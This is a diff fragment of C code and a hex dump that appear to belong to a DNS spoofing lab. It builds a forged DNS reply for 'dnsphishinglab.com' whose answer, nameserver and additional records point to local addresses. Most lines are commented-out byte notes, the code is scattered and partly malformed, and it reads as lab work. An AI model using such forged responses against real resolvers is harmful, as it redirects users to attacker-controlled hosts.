@@ -1,0 +1,144 @@
+@line 22
+c0
+0c
+00
+01
+00
+01
+00
+ff
+ff
+ff
+00
+04
+c0
+a8
+00
+20
+
+
+
+
+//	struct stat statbuf;
+//    stat("query_payload\0", &statbuf); //statbuf.st_size
+		//c = (unsigned)strtol(hex, NULL, 16) ;
+		//printf("character:%x\n", c) ;
+//	while(feof(infile) != 0)
+		//fscanf(infile, "%x", hex[0]) ;
+	//while((hex[0] = getc(infile)) != EOF)
+/*
+	char payload[]= "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07" ;
+printf("size of payload:%i\n", sizeof(payload)) ;
+*/
+//printf("string:%s\n", subdomain) ;
+//printf("strlen:%i\n", strlen(subdomain)) ;
+
+
+
+
+// Begin writing answers
+
+	//Name
+
+
+	// Type = "\x00" "\x01"
+
+
+	// Class= "\x00" "\x01"
+
+	//TTL of 3 days = "\x00" "\x03" "\xf4" "\x80"
+
+
+	//Data length of 4 = "\x00" "\x04"
+
+	//Address of 192.168.0.28 = "\xc0" "\xa8" "\x00" "\x1c"
+
+
+
+
+//Authoritative nameservers
+
+	//Name
+
+
+	// Type = "\x00" "\x02"
+
+
+	//Class = "\x00" "\x01"
+
+	//TTL = "\x00" "\x03" "\xf4" "\x80"
+
+	//Data length of 5 = "\x00" "\x05"
+
+	//Name server = "\x02" "\x6e" "\x73" "\xc0" "\x17"
+
+
+// Additional records
+
+	//Name 	"\xc0" "\x4b"
+
+
+	// Type = "\x00" "\x01"
+
+
+	// Class= "\x00" "\x01"
+
+	//TTL of 3 days = "\x00" "\x03" "\xf4" "\x80"
+
+
+	//Data length of 4 = "\x00" "\x04"
+
+	//Address of 192.168.0.22 = "\xc0" "\xa8" "\x00" "\x16"
+
+//-------------
+
+	// Root = "\x00"
+
+	// Type OPT = "\x00" "\x29"
+
+	// UDP Payload size = "\x10" "\x00"
+
+	// Higher bits = "\x00"
+
+	// EDNS version = "\x00"
+
+	// Z = "\x80" "\x00"
+
+	// Data length = "\x00" ""\x00""
+
+
+
+
+
+
+
+
+
+
+
+// Write subdomain Query section in format:
+//"(# bytes of sub in \x)" +"xyz1234.dnsphishinglab.com" + 0x00 + 0x00 + 0x01 + 0x00 + 0x01
+
+	//printf("strlen:%x\n", (unsigned char)(strchr(subdomain, '.') - subdomain)) ;
+	*(payload_location + i)	= (unsigned char)(strchr(subdomain, '.') - subdomain) ;
+	i++ ;
+
+
+
+	for(iter = i; i < iter + strlen(subdomain); i++) *(payload_location + i) = subdomain[i - iter] ;
+	 
+	unsigned char payload_tail[] = "\x00" "\x00" "\x01" "\x00" "\x01" ;
+	for (iter = i; i < iter + 5; i++) *(payload_location + i) = payload_tail[i - iter] ;
+
+
+
+
+
+
+
+
+
+
+
+
+
